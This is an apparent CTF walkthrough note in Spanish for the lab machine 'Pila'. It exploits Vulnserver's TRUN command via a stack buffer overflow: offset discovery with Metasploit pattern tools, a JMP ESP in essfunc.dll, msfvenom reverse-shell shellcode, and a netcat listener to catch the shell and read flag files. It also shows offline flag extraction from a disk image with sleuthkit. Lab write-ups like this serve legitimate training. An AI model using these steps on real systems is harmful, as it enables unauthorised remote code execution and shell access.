---
tags: [ctf, thehackerslabs, windows, walkthrough, buffer-overflow]
tipo: walkthrough
estado: resuelto
---

# Pila — Walkthrough

> [!note] Cómo leer esta nota
> **comando → salida relevante → interpretación → por qué**. Pasos del roadmap de Pila; el detalle extendido está en [[Pila - Roadmap]].

## Paso 1 — Escaneo del puerto 9999

**Comando**
```bash
nmap -sV -p9999 <IP>
nc -nv <IP> 9999
```

**Salida relevante**
```text
9999/tcp open  ...  (banner de Vulnserver)
Welcome to Vulnerable Server! Enter HELP for help.
```

**Interpretación / por qué**
- `Vulnserver` es un binario deliberadamente vulnerable: primer candidato a **buffer overflow**.

## Paso 2 — Enumerar comandos

**Comando**
```text
HELP
```

**Interpretación / por qué**
- Se listan `STATS, RTIME, LTIME, SRUN, TRUN, GMON, GDOG, KSTET, GTER, HTER, LTER, KSTAN`.
- `TRUN` y `GMON` desbordan la pila.

## Paso 3 — Confirmar el desbordamiento

**Comando**
```text
TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

**Interpretación / por qué**
- `Function3()` copia la entrada en `Buffer2S[2000]` con `strcpy` **sin límite** → desbordamiento y control potencial de EIP.

## Paso 4 — Offset a EIP

**Comando**
```bash
msf-pattern_create -l 3000
# enviar: TRUN /.:/<patrón>
msf-pattern_offset -l 3000 -q <valor_de_EIP>
```

**Interpretación / por qué**
- Se obtiene el desplazamiento exacto hasta EIP.

## Paso 5 — `JMP ESP` y shellcode

**Comando**
```bash
# Buscar JMP ESP (mona.py / msf-nasm_shell)
nasm -f win32
# Generar shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f c
```

**Interpretación / por qué**
- Sin **ASLR** en Windows Server 2008 x86, un `JMP ESP` de un módulo estable (`essfunc.dll`) permite saltar al shellcode.
- Hay que validar **badchars** y evitar `\x00`.

## Paso 6 — Shell y flags

**Comando**
```bash
nc -nlvp 4444
# enviar payload: TRUN /.:/ + padding + EIP(JMP ESP) + NOPs + shellcode
whoami
type C:\Users\Pila\Desktop\user.txt
type C:\Users\Administrador\Desktop\root.txt
```

## Paso 6b — Alternativa: extracción offline del NTFS

**Comando**
```bash
fls -r -p pila.raw | grep -i -E 'user.txt|root.txt'
icat pila.raw <inode>
```

**Interpretación / por qué**
- Permite obtener los flags **sin** explotar el overflow. Se documenta como camino alternativo válido.

## Qué funcionó

- Enumerar comandos con `HELP` y elegir `TRUN`.
- Calcular offset con `pattern_create` y usar `JMP ESP` de `essfunc.dll`.

## Qué falló (y por qué)

- (no documentado)

## Qué aprendí

- Stack BOF clásico x86 y lectura offline con sleuthkit.
